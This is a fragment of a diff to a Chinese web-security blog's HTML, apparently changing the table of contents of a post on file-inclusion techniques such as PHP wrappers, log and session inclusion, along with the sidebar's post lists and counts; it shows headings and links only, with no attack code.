toc-level-5"><a class="toc-link" href="#43-zlib"><span class="toc-number">1.1.0.4.3.</span> <span class="toc-text"> 4.3 zlib:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5data"><span class="toc-number">1.1.0.5.</span> <span class="toc-text"> 5.data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 一些小题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cgi-fast-cgi"><span class="toc-number">1.2.</span> <span class="toc-text"> CGI、FAST CGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text"> 日志包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text"> session 包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E9%81%93ctf%E5%85%B3%E4%BA%8Esession%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.0.1.</span> <span class="toc-text"> 一道 CTF 关于 session 包含的题目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.</span> <span class="toc-text"> 临时文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.6.</span> <span class="toc-text"> SSH 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%ABprocselfenviron"><span class="toc-number">1.7.</span> <span class="toc-text"> 包含 &#x2F; PROC&#x2F;SELF&#x2F;ENVIRON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.8.</span> <span class="toc-text"> phpinfo 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lfiphp7-collapse"><span class="toc-number">1.9.</span> <span class="toc-text"> LFI+php7 collapse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E4%B8%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.10.</span> <span class="toc-text"> docker 中文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hxp-ctf"><span class="toc-number">1.11.</span> <span class="toc-text"> hxp ctf</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#file-include"><span class="toc-number">1.</span> <span class="toc-text"> file include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> PHP 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1file%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.0.1.</span> <span class="toc-text"> 1.file 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2phpfilter"><span class="toc-number">1.1.0.2.</span> <span class="toc-text"> 2.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3phpinput"><span class="toc-number">1.1.0.3.</span> <span class="toc-text"> 3.php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4zipbzip2-zlib"><span class="toc-number">1.1.0.4.</span> <span class="toc-text"> 4.zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#41-zip"><span class="toc-number">1.1.0.4.1.</span> <span class="toc-text"> 4.1 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#42-bzip2"><span class="toc-number">1.1.0.4.2.</span> <span class="toc-text"> 4.2 bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#43-zlib"><span class="toc-number">1.1.0.4.3.</span> <span class="toc-text"> 4.3 zlib:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5data"><span class="toc-number">1.1.0.5.</span> <span class="toc-text"> 5.data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 一些小题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cgi-fast-cgiphp-fpm"><span class="toc-number">1.2.</span> <span class="toc-text"> CGI、FAST CGI，PHP FPM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text"> 日志包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text"> session 包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E9%81%93ctf%E5%85%B3%E4%BA%8Esession%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.0.1.</span> <span class="toc-text"> 一道 CTF 关于 session 包含的题目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.</span> <span class="toc-text"> 临时文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.6.</span> <span class="toc-text"> SSH 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%ABprocselfenviron"><span class="toc-number">1.7.</span> <span class="toc-text"> 包含 &#x2F; PROC&#x2F;SELF&#x2F;ENVIRON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.8.</span> <span class="toc-text"> phpinfo 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lfiphp7-collapse"><span class="toc-number">1.9.</span> <span class="toc-text"> LFI+php7 collapse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E4%B8%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.10.</span> <span class="toc-text"> docker 中文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%A4%9A%E7%BA%A7%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%BB%95%E8%BF%87require_once"><span class="toc-number">1.11.</span> <span class="toc-text"> 通过多级软链接绕过 require_once</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hxp-ctf"><span class="toc-number">1.12.</span> <span class="toc-text"> hxp ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#the-end-of-lfi"><span class="toc-number">1.12.1.</span> <span class="toc-text"> the end of LFI</span></a></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
         <ul>
-          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li class="active"><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li>
+          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/04/16/Unserialize/" rel="bookmark" title="反序列化">反序列化</a></li><li class="active"><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="Overview">
@@ -568,19 +634,19 @@ require(),require_once()<br>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">10</span>
+        <span class="count">13</span>
         <span class="name">posts</span>
       </a>
     </div>
     <div class="item categories">
       <a href="/categories/">
-        <span class="count">3</span>
+        <span class="count">4</span>
         <span class="name">categories</span>
       </a>
     </div>
     <div class="item tags">
       <a href="/tags/">
-        <span class="count">4</span>
+        <span class="count">5</span>
         <span class="name">tags</span>
       </a>
     </div>
@@ -610,7 +676,7 @@ require(),require_once()<br>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2022/05/27/CSRF/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+        <a href="/2022/05/27/emergency%20response/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -632,10 +698,29 @@ require(),require_once()<br>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
+</div>
+
+    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/16/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
+    <span><a href="/2022/04/16/Unserialize/" title="反序列化">反序列化</a></span>
   </li>
 
       
@@ -662,9 +747,10 @@ require(),require_once()<br>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2022/10/16/hello-world/" title="Hello World">Hello World</a></span>
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
   </li>
 
       
@@ -684,17 +770,7 @@ require(),require_once()<br>
 <a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
-</div>
-
-    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
+    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
   </li>
 
       
@@ -704,7 +780,7 @@ require(),require_once()<br>
 <a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
 </div>
 
-    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
+    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
   </li>
 
       
@@ -714,16 +790,6 @@ require(),require_once()<br>
 </div>
 
     <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
-</div>
-
-    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
   </li>
 
   </ul>
